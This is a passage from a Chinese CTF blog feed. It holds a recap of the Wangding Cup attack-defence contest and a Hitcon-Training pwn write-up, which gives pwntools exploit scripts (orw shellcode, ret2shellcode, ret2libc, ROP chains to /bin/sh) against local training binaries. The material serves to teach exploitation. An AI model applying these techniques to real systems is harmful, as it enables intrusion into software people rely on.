    <content type="html"><![CDATA[<p> 今年参加了一次某春秋的红帽杯，已经被恶心了一次，想不想这次网鼎杯更加肆无忌惮。本来是不打算参加的，所以也没认真准备。</p><p> <img src="http://ww1.sinaimg.cn/large/6701be31gy1fv1b29wr0nj21400u0q5z.jpg" alt="image"></p><p> <img src="http://ww1.sinaimg.cn/large/6701be31gy1fv1b2jjp0xj21400u00x4.jpg" alt="image"></p><h2 id="半决赛"><a href="#半决赛" class="headerlink" title="半决赛"></a>半决赛</h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>   一道web三道pwn，web的权限很迷，上去发现ctf的账号无法权限修改网站，一度懵逼，还好细心的队友发现可以<code>su apache</code>。好彩web没预留无脑一句话，不至于一上来就被上不死马（参考今年红帽杯，神一般的速度）。本组实力较弱，web很迟才有队伍拿一血，后面抓到别人的流量直接打回去了，不过脚本没准备好，重放速度有点慢。后面看pwn题，发现一道是原题，就是改了一下描述而已，然而gamebox用的是centos，dump下libc放在ubuntu，死活运行不起来，无法动态调试，中途一度想放弃治疗，后来换了个姿势，发现竟然成功getshell了，很幸运的拿下了pwn的一血。然而自动提交的脚本效果不佳，导致有一半的flag都没交上，有几轮甚至一个都没提交，后来发现不还如用burp跑稳定。之后，有队伍做出了其余两题pwn，其中一题成功抓到流量，由于一个低级错误，复现时间过长，导致被别人抛离了，另外一题流量没抓齐，之后再补吧。</p><h3 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h3><p>  拿到pwn之后，本以为可以轻松打全场，但是发现后来能打到的只10多队，很多直接是端口都不通，也不见有服务down扣分的情况，上通防我就认了，端口不通都不算服务异常？！队友举手找裁判投诉，后面也不了了之。事后看知乎吐槽，估计半决赛连check都没有，直接删站，删ELF完事。</p><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><p>  时间没到，发现就能登gamebox了，然而快开始了有无缘无故断掉了，看到旁边的师傅已经准备脚本打过，瑟瑟发抖。网络连通后，发现web题跟昨天的一毛一样，有一题pwn也是（这么省钱吗？），手脚太慢，没把握住机会拿分，损失惨重。还有一个噩耗是，昨天通防pwn的方法不行了（看来昨晚加班写checker了），服务异常扣了很多分。名次一度到30+，后来稳住之后，靠昨天的脚本，慢慢的打回来了，web题也抓到Venenof7师傅的流量，也成功回放拿了不少flag，pwn题调整了一下脚本，可以稳定15+个flag，两题加起来有30+个flag，排名也稳步前进。当我以为可以苟住的时候，来自东方的神秘力量出现了，gamebox开始被打了，每轮都会被随机打一两个，开始手忙脚乱地去修复，不小心还导致服务down了几次，瞬间崩盘。事后发现，其实根本没必要修复，一切都是命运的安排（不便多说）。赛后发现pwn题其实不难，没花精力去搞一下确实太亏了，技不如人，甘拜下风。</p><h3 id="吐槽-1"><a href="#吐槽-1" class="headerlink" title="吐槽"></a>吐槽</h3><p>  决赛终于体验了一把什么叫神仙打架，什么0day拿flag，什么叫被安排得明明白白。还是好好学习吧，提升下技术，像人家eee，NU1l，0x300那么强劲，别人也安排不了你。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt; 今年参加了一次某春秋的红帽杯，已经被恶心了一次，想不想这次网鼎杯更加肆无忌惮。本来是不打算参加的，所以也没认真准备。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://ww1.sinaimg.cn/large/6701be31gy1fv1b29wr0nj21400u0q5
      
    
    </summary>
    
    
      <category term="吐槽" scheme="https://4f-kira.github.io/tags/%E5%90%90%E6%A7%BD/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon-Training-Writeup</title>
    <link href="https://4f-kira.github.io/2018/07/11/hitcontraining/"/>
    <id>https://4f-kira.github.io/2018/07/11/hitcontraining/</id>
    <published>2018-07-11T02:51:45.000Z</published>
    <updated>2018-07-11T03:10:28.928Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Outline"><a href="#Outline" class="headerlink" title="Outline"></a>Outline</h3><ul><li>Basic Knowledge<ul><li>Introduction<ul><li>Reverse Engineering<ul><li>Static Analysis</li><li>Dynamic Analysis </li></ul></li><li>Exploitation</li><li>Useful Tool<ul><li>IDA PRO</li><li>GDB</li><li>Pwntool</li></ul></li><li>lab 1 - sysmagic</li></ul></li><li>Section</li><li>Compile,linking,assmbler</li><li>Execution<ul><li>how program get run</li><li>Segment </li></ul></li><li>x86 assembly<ul><li>Calling convention </li><li>lab 2 - open/read/write</li><li>shellcoding</li></ul></li></ul></li><li>Stack Overflow<ul><li>Buffer Overflow</li><li>Return to Text/Shellcode<ul><li>lab 3 - ret2shellcode </li></ul></li><li>Protection<ul><li>ASLR/DEP/PIE/StackGuard</li></ul></li><li>Lazy binding</li><li>Return to Library<ul><li>lab 4 - ret2lib </li></ul></li></ul></li><li>Return Oriented Programming<ul><li>ROP<ul><li>lab 5 - simple rop </li></ul></li><li>Using ROP bypass ASLR<ul><li>ret2plt</li></ul></li><li>Stack migration<ul><li>lab 6 - migration</li></ul></li></ul></li><li>Format String Attack<ul><li>Format String </li><li>Read from arbitrary memory<ul><li>lab 7 - crack</li></ul></li><li>Write to arbitrary memory<ul><li>lab 8 - craxme</li></ul></li><li>Advanced Trick<ul><li>EBP chain </li><li>lab 9 - playfmt </li></ul></li></ul></li><li><p>x64 Binary Exploitation</p><ul><li>x64 assembly</li><li>ROP</li><li>Format string Attack</li></ul></li><li><p>Heap exploitation</p><ul><li>Glibc memory allocator overview</li><li>Vulnerablility on heap<ul><li>Use after free<ul><li>lab 10 - hacknote</li></ul></li><li>Heap overflow <ul><li>house of force <ul><li>lab 11 - 1 - bamboobox1</li></ul></li><li>unlink<ul><li>lab 11 - 2 - bamboobox2</li></ul></li></ul></li></ul></li></ul></li><li>Advanced heap exploitation<ul><li>Fastbin attack<ul><li>lab 12 - babysecretgarden </li></ul></li><li>Shrink the chunk</li><li>Extend the chunk<ul><li>lab 13 -  heapcreator</li></ul></li><li>Unsortbin attack<ul><li>lab 14 - magicheap</li></ul></li></ul></li><li>C++ Exploitation<ul><li>Name Mangling </li><li>Vtable fucntion table</li><li>Vector &amp; String</li><li>New &amp; delete</li><li>Copy constructor &amp; assignment operator<ul><li>lab 15 - zoo </li></ul></li></ul></li></ul><h3 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1-sysmagic"></a>lab1-sysmagic</h3><p>这是一题逆向，应该是让你学会静态分析及动态调试。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Give me maigc :"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line"><span class="keyword">if</span> ( buf == v2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">    <span class="built_in">putchar</span>((<span class="keyword">char</span>)(*(&amp;v5 + i) ^ *((_BYTE *)&amp;v54 + i)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>伪代码跟原C代码非常相似了，就是简单xor，静态方法代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v5 = <span class="string">"Do_you_know_why_my_teammate_Orange_is_so_angry???"</span></span><br><span class="line">v54 = [<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(ord(x)^y) <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(v5,v54)]) <span class="comment">#CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;</span></span><br></pre></td></tr></table></figure></p><p>修改代码方法修改if的判断即可，<code>jnz</code>改<code>jz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048722                 jz      short loc_8048760 ; Keypatch modified this from:</span><br><span class="line">.text:08048722                                           ;   jnz short loc_8048760</span><br></pre></td></tr></table></figure></p><p>patch后运行</p><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fsz88hg8mrj20g101y3yf.jpg" alt=""></p><p>gdb动态调试也可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *get_flag+389  #下断点</span><br><span class="line">set $eax=$edx    #改成一样 cmp自然能过</span><br></pre></td></tr></table></figure></p><h3 id="lab2-orw-bin"><a href="#lab2-orw-bin" class="headerlink" title="lab2-orw.bin"></a>lab2-orw.bin</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab2/orw.bin&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give my your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很简单，输入后可以运行shellcode，但要留意一下<code>orw_seccomp()</code>这个函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [esp+Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(&amp;v3, &amp;unk_8048640, <span class="number">0x60</span>u);</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数会限制syscall的使用，本题只能用open,read,write这三个syscall来cat flag，需要手工进行shellcode编写。调用可通过man查看或到这个<a href="http://syscalls.kernelgrok.com" target="_blank" rel="noopener">网站</a>找<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;              <span class="comment">//eax=0x5</span></span><br><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);          <span class="comment">//eax=0x3</span></span><br><span class="line"><span class="keyword">ssize_t</span> write(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);   <span class="comment">//eax=0x4</span></span><br></pre></td></tr></table></figure></p><p>手写版：<code>fp = open(&quot;flag&quot;,0) -&gt; read(fp,buf,0x30) -&gt; write(1,buf,0x30)</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./orw.bin'</span>)</span><br><span class="line">shellcode=<span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,0x5</span></span><br><span class="line"><span class="string">push ecx</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov ebx,0x3</span></span><br><span class="line"><span class="string">mov dl,0x30</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">mov eax,0x4</span></span><br><span class="line"><span class="string">mov bl,0x1</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>利用pwntools的<code>shellcraft</code>写：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.pushstr(<span class="string">"flag"</span>)  <span class="comment">#flag路径</span></span><br><span class="line">shellcode += shellcraft.open(<span class="string">"esp"</span>)     </span><br><span class="line">shellcode += shellcraft.read(<span class="string">"eax"</span>, <span class="string">"esp"</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">"esp"</span>, <span class="number">0x30</span>)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3-ret2sc"></a>lab3-ret2sc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab3/ret2sc&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;name, <span class="number">0x32</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Try your best:"</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)gets(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>name</code>处写入shellcode，覆盖<code>ret</code>为shellcode地址，需要注意的是通过esp寻址的，因此具体的offset可以通过调试查看<br><img src="http://ww1.sinaimg.cn/large/6701be31gy1fszzph2uo0j20fk0280sp.jpg" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2sc'</span>)</span><br><span class="line">name = <span class="number">0x804a060</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,asm(shellcraft.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">32</span>+p32(name))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4-ret2lib"></a>lab4-ret2lib</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab4/ret2lib&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> **v3; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// [esp+12h] [ebp-10Eh]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+112h] [ebp-Eh]</span></span><br><span class="line">  _DWORD *v8; <span class="comment">// [esp+11Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know return to library ?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"###############################"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What do you want to see in memory?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give me an address (in dec) :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  v8 = (_DWORD *)strtol(&amp;buf, v3, v4);</span><br><span class="line">  See_something(v8);                            <span class="comment">// return printf("The content of the address : %p\n", *a1);</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Leave some message for me :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;src, <span class="number">0x100</span>u);</span><br><span class="line">  Print_message(&amp;src);                          <span class="comment">// strcpy(&amp;dest, src);</span></span><br><span class="line">                                                <span class="comment">// return printf("Your message is : %s", &amp;dest);</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Thanks you ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开了NX，程序自带打印内存信息的函数，泄露函数地址，溢出后组ROP即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">"./ret2lib"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2lib"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, str(elf.got[<span class="string">"puts"</span>]))</span><br><span class="line">p.recvuntil(<span class="string">" : "</span>)</span><br><span class="line">libc.address = int(p.recvuntil(<span class="string">"\n"</span>, drop = <span class="keyword">True</span>), <span class="number">16</span>) - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">success(<span class="string">"libcBase -&gt; &#123;:#x&#125;"</span>.format(libc.address))</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">'a'</span>*<span class="number">60</span>, libc.symbols[<span class="string">"system"</span>], <span class="number">0xdeadbeef</span>, next(elf.search(<span class="string">"sh\x00"</span>)))</span><br><span class="line">p.sendlineafter(<span class="string">" :"</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5-simplerop"></a>lab5-simplerop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab5/simplerop&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ROP is easy is'nt it ?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your input :"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先找一下常用的rop<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0809a15d : mov dword ptr [edx], eax ; ret</span><br><span class="line">0x0806e829 : pop ebx ; pop edx ; ret</span><br><span class="line">0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x080bae06 : pop eax ; ret</span><br><span class="line">0x080493e1 : int 0x80</span><br></pre></td></tr></table></figure></p><p>用ROPgadget用直接生成ropchain，然鹅输入长度不够，必须进行手工修改。方法一：调用read将<code>/bin/sh</code>读入bss段<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">p_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line">rop = <span class="string">'a'</span>*<span class="number">32</span></span><br><span class="line">rop += flat(elf.sym[<span class="string">'read'</span>], p_edx_ecx_ebx_ret, <span class="number">0</span>, elf.bss(), <span class="number">0x10</span>)</span><br><span class="line">rop += flat(p_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, elf.bss())</span><br><span class="line">rop += flat(p_eax_ret, <span class="number">0xb</span>, int_80)</span><br><span class="line"><span class="keyword">print</span> len(rop) <span class="comment"># 80</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">':'</span>,rop)</span><br><span class="line">raw_input(<span class="string">'getshell'</span>) </span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p>方法二，修改一下自动生成的ropchain，主要是改了后半段繁琐的rop<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 